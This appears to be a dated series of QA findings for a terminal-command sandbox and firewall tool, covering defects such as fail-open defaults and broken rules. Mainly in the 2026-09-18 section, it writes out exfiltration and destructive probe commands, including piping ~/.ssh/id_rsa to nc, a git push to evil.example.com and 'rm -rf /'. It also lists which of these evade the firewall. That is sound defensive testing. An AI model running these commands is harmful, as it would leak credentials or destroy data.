
## Dogfood Findings (2026-09-17)
Verdict: PROMISING-BUT-ROUGH (t2fs <5s, friction 5; roughness moved again — DF-6/DF-8 + TJ-DF-015/016 fixes re-verified live at HEAD 186dc77; new gaps are the wrapper execution layer and firewall observability)
Promise: A user can contain terminal commands via the standalone CLI `terminal-jail` (PID namespace / `--user` fallback on DEGRADED hosts), and the Interruptor firewall decides allow/block/modify for every command before execution.
Time-to-first-success: <5s (version probe + bridge allow/block on first command). Suite: 420 passed / 14 skipped in 15.14s.

- [P1] DF-TERMINAL-JAIL-11 — Auto-sandbox (modify) dead-ends on DEGRADED hosts: `./standalone/terminal-jail bash script.sh` prints "Modified: … → sandboxed" then exits 2 ("namespace creation failed"), command never run; same for make/pytest/go-test/pip/script runs. The bridge prefixes `unshare --user --pid --fork --kill-child=SIGKILL bash -c …` — flags that SUCCEED via `--user` (rc=0, verified same session) — but the wrapper's bare-mode preflight (standalone/terminal-jail:366) exits 2 before the already-prefixed branch (:386) can run. All 8 auto-sandbox classes unusable on this host class. Fix: skip/re-branch the preflight for bridge-prefixed commands; DEGRADED-host modify regression test.
- [P1] DF-TERMINAL-JAIL-12 — Default-allow posture documented NOWHERE + allow verdicts carry no provenance: unmatched commands return allow with rule_id null (probed `cat /etc/passwd`, `ls | grep secret`, `chmod 777 ~/work`), and EXPLICIT allowlist hits (`ls`, `pwd`, `which`, `git status`) are indistinguishable — rule_id always null on allow. An audit consumer can't tell an allowlisted command from an unexamined one. Fix: emit rule_id on allowlist matches + document "unmatched = ALLOWED" prominently in README/quickstart/specs.
- [P2] DF-TERMINAL-JAIL-13 — allow-cat-safe's negative lookahead `(?!.*/(etc|boot|proc|sys))` can never exclude those paths (`.*` matches empty), so the rule is a silent no-op exactly where its description ("non-sensitive paths") claims to discriminate: `cat /etc/passwd` rides default-allow, never allow-cat-safe. Fix: anchor to token boundary `^cat\s+(?!/(etc|boot|proc|sys)(/|\s|$))` + regression asserting the matched rule.
- [P2] DF-TERMINAL-JAIL-14 — SKIPPED-install-bunker (evidence, never silent): `bunker spawn --server bunker-las-03` deadline_exceeded ×2; `bunker list` empty; half-spawned users have NO rootless docker.sock (fresh-agent install never completes) — regression vs 09-15 PASS. Host healthy (bunkerd active, docker 26.1.5, outbound 200). Half-spawned users cleaned via root ssh; 3 pre-existing stale users noted. Infra owner follow-up; local evidence this run = scratch-prefix install 1s with live ~/.config rules untouched (DF-8 fix verified).

Re-verified fixed this run: DF-6 (all schema errors carry [bridge-error] markers), DF-8 (scratch install scopes rules to the prefix), TJ-DF-015 (loud `no filesystem isolation` warn + honest degraded docs), TJ-DF-016 (warn line precedes preflight death). Still open from prior runs: DF-7, DF-9, DF-10, TJ-GAP-058..062. Artifacts: docs/dogfood/2026-09-17-integration.md, diagnostics.md §5, skills pitfall 7 + right-way patterns refreshed. No cooldown changes; foreman not woken (6h fleet law 2026-09-09).

## Prior Findings (2026-09-15)
Verdict: PROMISING-BUT-ROUGH (roughness moved: docs/firewall/install now deliver; the `--user` isolation claim doesn't)
Promise: A user can contain terminal commands (PID namespace, firewall, privilege drop, seccomp) via the standalone CLI `terminal-jail`, with `--user` fallback on hosts denying unprivileged PID namespaces.
Time-to-first-success: <1 min local; bunker fresh-machine clone→install→smoke <2 min (install 0s, smoke ok, probe DEGRADED as documented).

- [P0] TJ-DF-015 — `--user` "nobody" is an unmapped-namespace illusion: NO filesystem isolation. `unshare --user` launches with no uid mapping; uid displays show 65534 but DAC evaluates as the caller (owner). Verified: jailed process read a mode-600 caller file and created files in caller HOME as kara:kara; control `sudo -u nobody` → errno 13. Also baked into engine auto-sandbox prefix. Fix: real uid mapping (--map-auto / newuidmap+subuid); interim: document `--user` = PID containment + env scrub only. Evidence: docs/dogfood/2026-09-15-integration.md §4.
- [P1] TJ-DF-016 — warn mode on EPERM hosts dies silent: preflight exit 2 precedes the WARN line, so "warn = warns, allows" never materializes end-to-end on DEGRADED hosts. Fix: evaluate firewall before preflight, print verdict regardless of namespace outcome.
- [P2] TJ-DF-017 — quickstart/skill verify example (`--user echo "in jail"`) proves no containment property on EPERM hosts; pidns-capability-probe.py still not wired into the verify block. Fix: probe first, branch FULL/DEGRADED.
- [P3] TJ-DF-018 — upstream skill drift (NOT this repo): bunker recipe says :19090 but deployed bunkerd listens :10001/:10002; token capture includes YAML quotes. Recorded for the dogfood-skill owner; do not dispatch a foreman on this row.

Prior-run verification (all PASS this run): TJ-DF-011 chmod variants block at bridge AND CLI; TJ-DF-012 same-ID warn override warns on stderr; TJ-DF-014 env scrub live; DF-TERMINAL-JAIL-3 reinstall backs up edited rules. Install leg: local scratch-HOME + ephemeral bunker (las-bunker-03) both clean; no SKIPPED-install-bunker.

Verdict: PROMISING-BUT-ROUGH
Promise: {"entry_point":"Standalone CLI wrapper: standalone/terminal-jail (56-line bash script wrapping `unshare --pid --fork --mount-proc --kill-child=SIGKILL bash -c 'exec "$@"'`); plus a JSON bridge firewall API (plugin/terminal_jail/interruptor_bridge.py, reads one JSON command on stdin, returns allow/

- [P1] Firewall bridge fail-open on malformed input is undocumented — Invalid JSON / empty stdin on the interruptor bridge returns action=allow (fail-open) — security-relevant default for a command firewall, documented only in bridge source, absent from README/quickstar
- [P1] Quickstart verify block fails out of the box on this host — 2nd verify command (bare `terminal-jail echo "in jail"`) exits 2 on this EPERM host; the --user fallback is buried in a blockquote and scripts/pidns-capability-probe.py exists but is never surfaced. A
- [P1] Re-running install.sh clobbers customized user rules — install.sh unconditionally overwrites ~/.config/terminal-jail/rules.d/00-builtins.yaml — user rule edits lost on reinstall with no backup or prompt. Also hardcodes $HOME/.local/bin into the PATH-appen
- [P2] Stale rule_id in quickstart bridge example (promise broken) — README/quickstart shows output rule_id "I-BLOCK-001" but the engine emits "builtin-rm-rf-root" — grep target doesn't exist, so doc-driven validation of the firewall fails. One of two explicitly broken
- [P2] warn mode wording misleading on EPERM hosts; --user PATH inheritance undocumented — "warn mode warns, allows" is false on EPERM hosts: firewall passes the command but the namespace layer still exits 2 unless --user is also added. --user jail scrubs USER/LOGNAME/HOME but inherits call

## Dogfood Findings (2026-09-16)
Verdict: PROMISING-BUT-ROUGH
Promise: {"entry_point":"CLI binary/shell wrapper — the executable Bash script standalone/terminal-jail (installed to ~/.local/bin/terminal-jail by install.sh); secondary entry points are the Hermes plugin plugin/terminal_jail/ (observability hooks only, does NOT wrap commands), the deploy shell shim standal

- [P1] Bridge fails OPEN silently on a misnamed/missing command key, with an empty reason and no [bridge-error] marker — Live at HEAD 4ab6182: `echo '{"Command": "rm -rf /"}' | python3 plugin/terminal_jail/interruptor_bridge.py` → {"action":"allow","command":"","rule_id":null,"reason":""} rc=0; same for {"cmd": ...} and
- [P1] builtin-chmod-777-root blocks ANY absolute path but allows ~-relative ones, and its message misstates the scope as 'root (/)' — Live: {"command":"chmod 777 /tmp/tjjudge/work"} → block, rule_id builtin-chmod-777-root, reason "Setting world-writable permissions on root (/) is blocked."; {"command":"chmod 777 /"} → same rule/mess
- [P1] install.sh rewrites the LIVE ~/.config/terminal-jail/rules.d/00-builtins.yaml even when TERMINAL_JAIL_INSTALL_DIR points at a scratch prefix — install.sh:161 hardcodes `user_rules_dir="$HOME/.config/terminal-jail/rules.d"` while line 14 honours TERMINAL_JAIL_INSTALL_DIR, so a scratch install mutates live user config outside the requested sco
- [P2] Rule counts in README/quickstart are stale vs the shipped engine, and there is no rule catalog — Shipped plugin/terminal_jail/rules/00-builtins.yaml parses to 39 rules (Counter: block 21, allow 10, sandbox 8), while README.md:46 and docs/quickstart.md:241,293 say "30 built-in rules (12 blocklist 
- [P2] Firewall only evaluates the top-level command string; script bodies are never inspected, and that is undocumented — Report reproduces it (a `sudo` call inside a script run through the jail was never ruled on — it failed only because the user namespace broke setuid). specs/interruptor.md and quickstart describe the '

## Dogfood Findings (2026-09-18)

Verdict: PROMISING-BUT-ROUGH
Promise: {"entry_point":"standalone CLI wrapper standalone/terminal-jail (PID-namespace containment + optional bwrap backend) + the Interruptor bash firewall JSON bridge plugin/terminal_jail/interruptor_bridge.py (allow/block/modify) + install.sh","claim":"a fresh user can install from a checkout, classify their host with the shipped probes, and run real work — including transparently auto-sandboxed build/test/script commands — under containment, with a command firewall that blocks reverse shells and exfil"}
Real use this run: 40-command work session through the documented bridge (0 false positives, 9 auto-sandboxed), 18-shape operator-rewrite matrix executed end-to-end, 36 attack vectors (13 blocked incl. every network-class revshell shape tried, 15 allowed, 8 auto-sandboxed), full fresh-machine install on an ephemeral bunker host (las-02: clone 210s, install <1s, verify FULL/FULL, rc=126 block, bwrap private /proc). Time-to-first-success <5s local; install 211s. Friction 6.
CANONICAL ROWS FILED IN .coding-hermes/board/tasks.jsonl as DF-TERMINAL-JAIL-15..20 (this section is the human-readable mirror).

- [P1] DF-TERMINAL-JAIL-15 — Auto-sandbox on uid-mapping hosts rewrites commands into a launch that cannot read the caller's own files. userns.py::unshare_prefix() picks the mapped prefix when mapped_launch_ok() is true, but that preflight only proves `unshare <flags> true` creates the namespace; with -S 65534 -G 65534 + --map-users=<subuid> the payload's host uid is the caller's SUBUID, so DAC denies the caller's home (drwx------). Live on a fresh Debian 13 host (subuid 1803936): `terminal-jail python3 scripts/pidns-capability-probe.py` (quickstart §3a Step 1, through the tool) -> Permission denied rc=2 while the direct run prints FULL; control shows the legacy prefix runs the same script and its writes land. Dev host is DEGRADED (AppArmor) so CI/tests/prior dogfood runs only ever exercised the working branch. Same root cause as QA-TERMINAL-JAIL-8, which frames it as test brittleness — the runtime defect would survive that fix. Workaround: TERMINAL_JAIL_UID_MAP=0 (engine-level verified) or TERMINAL_JAIL_INTERRUPTOR_MODE=disabled. Evidence: docs/dogfood/2026-09-18-integration.md §2.3.
- [P1] DF-TERMINAL-JAIL-16 — allow-cat-safe short-circuits the network-egress layer: `cat ~/.ssh/id_rsa | nc host 4444` -> allow with rule_id=allow-cat-safe (an APPROVED verdict, not default-allow); same for `nc -u host 53`. Unruled data-out shapes: `nc host < secret`, `dd if=secret | nc`, `tar czf - ~/.ssh | ssh host`, `rsync -av ~/ host:/tmp/`, `git push https://evil.example.com/loot.git`. TJ-GAP-058's shell-attach half is solid (11/11 blocked, correct ids) — the exfil half is not, despite the commit claiming it.
- [P1] DF-TERMINAL-JAIL-17 — Egress pack misses `curl -F 'file=@secret'` multipart (allow/null), the canonical `python3 -c` socket/pty reverse shell (allow/null — builtin-code-injection names only os.system/subprocess/eval/exec/__import__), and urllib/requests file-body POSTs (allow/null). `python3 -c` / `sh -c` are outside the auto-sandbox set while `python3 file.py` is inside.
- [P2] DF-TERMINAL-JAIL-18 — Shipped host-classification probes are not jail-aware: through the CLI, `pidns-capability-probe.py` -> `UNKNOWN: probe timed out after 15s`, `fs-isolation-probe.py` -> `UNKNOWN: probe error: [Errno 22] Invalid argument: '/tmp/tj-fsiso-*/secret600'`, where direct runs report FULL / DEGRADED. Both probes promise "classifies any host (exit 0)", so a user inside a jail-wrapped shell gets a misleading classification instead of an error.
- [P2] DF-TERMINAL-JAIL-19 — SKIPPED-install-bunker-on-las-03: `bunker spawn --server bunker-las-03` -> `deadline_exceeded` for the 2nd consecutive run (DF-14 closed as complete without restoring the capability) while the host is healthy (bunkerd active, load 0.05, newuidmap present, subuid ranges present) and 13 leaked bunker-* users (uids 1001-1015) remain. Install leg re-homed to bunker-las-02 and PASSED end-to-end; agent destroyed after the run. Owner: infra, not this repo's foreman.
- [P1] DF-TERMINAL-JAIL-20 — The egress pack's MODIFY verdicts do not prevent exfiltration. Measured with a real local collector: `curl -T secret http://127.0.0.1:18777/collect` -> modify/builtin-net-curl-upload, CLI exit 0, collector received 132 bytes containing the secret. Auto-sandbox contains the process; it does not stop the transfer, and on the mapping-less branch the sandboxed curl reads the caller's file fine. Only a BLOCK prevents egress — decide the intent per rule and either block or stop describing the group as exfil protection.
